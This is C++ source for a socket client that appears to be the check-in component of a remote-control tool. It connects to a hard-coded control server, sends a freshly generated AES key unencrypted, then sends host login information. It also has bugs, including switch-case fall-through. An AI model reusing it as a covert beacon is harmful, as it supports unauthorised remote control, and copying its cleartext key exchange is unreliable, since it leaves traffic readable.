#include "pch.h"
#include "SocketClient.h"
#include "Misc.h"
#include "Packet.h"
#include "Login.h"


#define SERVER_ADDRESS L"192.168.0.101"
#define SERVER_PORT 5555;


CSocketClient::CSocketClient() : m_pClient(this) {
	// 设置数据包最大长度（有效数据包最大长度不能超过0x3FFFFF字节(4MB-1B)，默认：262144/0x40000 (256KB)
	m_pClient->SetMaxPackSize(PACKET_MAX_LENGTH);
	// 设置心跳检测包发送间隔
	m_pClient->SetKeepAliveTime(60 * 1000);
	// 设置心跳检测重试包发送间隔
	m_pClient->SetKeepAliveInterval(20 * 1000);
}


CSocketClient::~CSocketClient() {

}


BOOL CSocketClient::StartSocketClient() {
	LPCTSTR lpszRemoteAddress = SERVER_ADDRESS;
	WORD wPort = SERVER_PORT;
	BOOL bRet = m_pClient->Start(lpszRemoteAddress, wPort);
	printf("bRet = %d\n", bRet);

	

	// 生成随机密钥
	BYTE pbKey[16];
	BYTE pbIv[16];
	RandomBytes(pbKey, 16);
	RandomBytes(pbIv, 16);
	m_Crypto = CCrypto(AES_128_CFB, pbKey, pbIv);

	// 向主控端发送密钥
	BYTE pbKeyAndIv[32];
	memcpy(pbKeyAndIv, pbKey, 16);
	memcpy(pbKeyAndIv + 16, pbIv, 16);
	bRet = m_pClient->Send(pbKeyAndIv, 32);
	printf("bret =%d\n", bRet);
	PrintBytes(pbKeyAndIv, 32);

	//CHAR szMsg[] = "I am iyzyi! I from BXS! BOOL CSocketClient::SendPacket(COMMAND_ID dwCommandId, PBYTE pbPacketBody, DWORD dwPacketBodyLBXS";
	//SendPacket(LOGIN, (PBYTE)szMsg, strlen(szMsg));

	return bRet;
}


BOOL CSocketClient::SendPacket(COMMAND_ID dwCommandId, PBYTE pbPacketBody, DWORD dwPacketBodyLength) {
	CPacket Packet = CPacket(&m_Crypto);
	Packet.PacketCombine(dwCommandId, pbPacketBody, dwPacketBodyLength);
	BOOL bRet = m_pClient->Send(Packet.m_pbPacketCiphertext, Packet.m_dwPacketLength);
	return bRet;
}







// 回调函数

EnHandleResult CSocketClient::OnHandShake(ITcpClient* pSender, CONNID dwConnID) {
	printf("[Client %d] OnHandShake: \n", dwConnID);

	return HR_OK;
}


EnHandleResult CSocketClient::OnConnect(ITcpClient* pSender, CONNID dwConnID) {
	printf("[Client %d] OnConnect: \n", dwConnID);

	return HR_OK;
}


EnHandleResult CSocketClient::OnSend(ITcpClient* pSender, CONNID dwConnID, const BYTE* pData, int iLength) {
	printf("[Client %d] OnSend: \n", dwConnID);

	return HR_OK;
}


EnHandleResult CSocketClient::OnReceive(ITcpClient* pSender, CONNID dwConnID, const BYTE* pData, int iLength) {
	printf("[Client %d] OnReceive: \n", dwConnID);


	CPacket Packet = CPacket(&m_Crypto);
	Packet.PacketParse((PBYTE)pData, iLength);
	
	switch (Packet.m_PacketHead.wCommandId) {

	case CRYPTO_KEY:		// Server接收到Client发出的密钥后，给Client响应一个CRYPTO_KEY包。然后Client发出上线包
		BYTE pbLoginPacketBody[LOGIN_PACKET_BODY_LENGTH];
		GetLoginInfo(pbLoginPacketBody);
		SendPacket(LOGIN, pbLoginPacketBody, LOGIN_PACKET_BODY_LENGTH);
		
	case LOGIN:
		
	default:
		;
	}


	return HR_OK;
}


EnHandleResult CSocketClient::OnClose(ITcpClient* pSender, CONNID dwConnID, EnSocketOperation enOperation, int iErrorCode) {
	printf("[Client %d] OnClose: \n", dwConnID);

	return HR_OK;
}